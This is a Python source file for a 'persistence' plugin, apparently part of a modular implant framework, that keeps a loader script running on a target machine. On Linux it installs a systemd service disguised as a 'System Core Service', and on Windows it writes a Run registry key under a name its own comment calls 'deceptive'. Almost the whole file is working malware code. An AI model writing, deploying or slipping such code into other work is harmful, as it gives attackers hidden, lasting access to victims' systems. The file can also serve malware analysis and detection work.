import os
import platform
import sys
import subprocess
import getpass
from typing import List, Dict, Any

from .base_plugin import BasePlugin

class PersistencePlugin(BasePlugin):
    """
    A plugin to establish persistence on the target system.
    Supports Windows (Registry) and Linux (systemd).
    """

    def __init__(self):
        self._data_buffer: List[Dict[str, Any]] = []
        self.is_running = False

    def get_name(self) -> str:
        return "persistence"

    def start(self, args: Dict[str, Any]):
        """
        Establishes persistence based on the operating system.
        The 'dry_run' argument can be used for testing.
        """
        if self.is_running:
            return

        self.is_running = True
        dry_run = args.get("dry_run", False)

        result = ""
        try:
            if platform.system() == "Linux":
                result = self._persist_linux(dry_run)
            elif platform.system() == "Windows":
                result = self._persist_windows(dry_run)
            else:
                result = f"Unsupported OS for persistence: {platform.system()}"
        except Exception as e:
            result = f"Failed to establish persistence: {e}"

        self._data_buffer.append({"status": result})
        self.is_running = False # This is a one-shot plugin

    def stop(self):
        pass

    def get_data(self) -> List[Dict[str, Any]]:
        data_to_send = list(self._data_buffer)
        self._data_buffer.clear()
        return data_to_send

    def _get_executable_path(self):
        """Determines the path of the script being run."""
        # This assumes the entry point is the loader script.
        # A real-world scenario might need a more robust way to find this.
        return os.path.abspath(sys.argv[0])

    def _persist_linux(self, dry_run: bool) -> str:
        """Creates a systemd service for persistence on Linux."""
        service_name = "crawler-agent.service"
        script_path = self._get_executable_path()
        python_executable = sys.executable

        service_content = f"""[Unit]
Description=System Core Service (Crawler)
After=network.target

[Service]
ExecStart={python_executable} {script_path}
Restart=always
User={getpass.getuser()}

[Install]
WantedBy=multi-user.target
"""

        if dry_run:
            # For testing, just return the content
            return service_content

        # This part requires root privileges.
        service_path = f"/etc/systemd/system/{service_name}"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", service_name], check=True)
            subprocess.run(["systemctl", "start", service_name], check=True)
            return f"Successfully created and enabled systemd service at {service_path}"
        except PermissionError:
            return "Error: Root privileges are required to create a systemd service."
        except Exception as e:
            return f"Error creating systemd service: {e}"

    def _persist_windows(self, dry_run: bool) -> str:
        """Creates a registry run key for persistence on Windows."""
        try:
            import winreg
        except ImportError:
            return "Cannot establish persistence on Windows: 'winreg' module not found."

        script_path = self._get_executable_path()
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "CrawlerSystemUpdate" # A deceptive name

        if dry_run:
            return f"DRY RUN: Would add REG_SZ value '{script_path}' to HKEY_CURRENT_USER\\{key_path}\\{key_name}"

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, script_path)
            return f"Successfully added persistence key to registry."
        except Exception as e:
            return f"Error setting registry key: {e}"
